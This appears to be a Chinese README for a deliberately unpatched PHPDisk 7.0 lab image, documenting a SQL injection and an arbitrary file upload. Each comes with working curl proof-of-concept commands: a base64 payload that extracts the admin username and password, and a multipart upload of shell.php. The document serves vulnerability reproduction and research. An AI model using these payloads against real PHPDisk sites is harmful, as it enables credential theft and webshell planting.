## 环境说明

测试镜像

- src/phpdisk/7.0

  - 管理员账号

    admin/admin123

  - 后台地址

    http://127.0.0.1/admincp.php

  - 补丁

    在Build20140812的基础上，unpatch了ajax.php的注入过滤补丁和plugins/phpdisk_client/client_sub.php的上传补丁

## PHPDisk 7.0 sql注入漏洞

测试镜像

* src/phpdisk/7.0

影响版本

* PHPDisk <= 7.0

参考链接

* [phpdisk最新20140529版注入 无视防御](http://www.secye.com/Network/loudongbuding/3628.html)

Poc

使用任意账号登录，如demo账号：

http://172.17.0.2/account.php?action=demologin

建立任意文件夹，并记录访问时的folder_id，如

http://172.17.0.2/mydisk.php?item=files&action=index&folder_id=1

编辑gen_payload_sqli.php中的folderid，生成payload：

```shell
php gen_payload_sqli.php
```

使用生成的base64进行注入，成功会返回`true|`：

```shell
curl -X POST -d 'folder_id=1&data=YTo1OntzOjc6ImZpbGVfaWQiO2k6MTtzOjk6ImZpbGVfc2l6ZSI7aToxO3M6MTQ6ImZpbGVfZXh0ZW5zaW9uIjtzOjM6ImpwZyI7czo5OiJmaWxlX25hbWUiO3M6MToiYSI7czoxNjoiZmlsZV9kZXNjcmlwdGlvbiI7czoyMTY6IicsJzEzMScsJzE0MDE2NDMxODMnLCcxJywnMCcsJzAnLCcyJywnMScsJzE5Mi4xNjguMS4xMDQnKSwoMSwoc2VsZWN0IGNvbmNhdCh1c2VybmFtZSwnOicscGFzc3dvcmQpIGZyb20gcGRfdXNlcnMgd2hlcmUgdXNlcmlkPTEpLCAnaDlWSTBTS20nLCAncGhwJywnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywnJywyMCwxNTMyMzUxMjY2LDEsMCwyLDIsMSwnMTcyLjE4LjEuMScpIyI7fQ==,1' "http://172.17.0.2/ajax.php?action=uploadCloud"
```

访问创建的文件夹，查看其中的文件得到注入结果



简易测试方法：

如果环境搭建后没有上传任何文件，可以直接使用curl post以上payload，再使用

```shell
curl http://172.17.0.2/viewfile.php?file_id=2 | grep "<title>.* - PHPDisk"
```

查看注入结果



## PHPDisk 7.0 文件上传漏洞

测试镜像

- src/phpdisk/7.0

影响版本

- PHPDisk <= 7.0

参考链接

- [phpdisk任意文件上传getshell](https://www.secpulse.com/archives/25008.html)

Poc

上传文件：

```shell
curl -X POST -H 'Content-Type: multipart/form-data;boundary=----WebKitFormBoundary5preDownN1n3hMj3' -H 'User-Agent: phpdisk-client'  -d '------WebKitFormBoundary5preDownN1n3hMj3
Content-Disposition: form-data; name="file_name"

aaa.gif
------WebKitFormBoundary5preDownN1n3hMj3
Content-Disposition: form-data; name="file1"; filename="shell.php"
Content-Type: application/x-php

<?php
phpinfo();
?>
------WebKitFormBoundary5preDownN1n3hMj3--' "http://172.17.0.2/plugins/phpdisk_client/client_sub.php?action=upload_file"
```

shell地址：

```
http://172.17.0.2/system/cache/shell.php
```

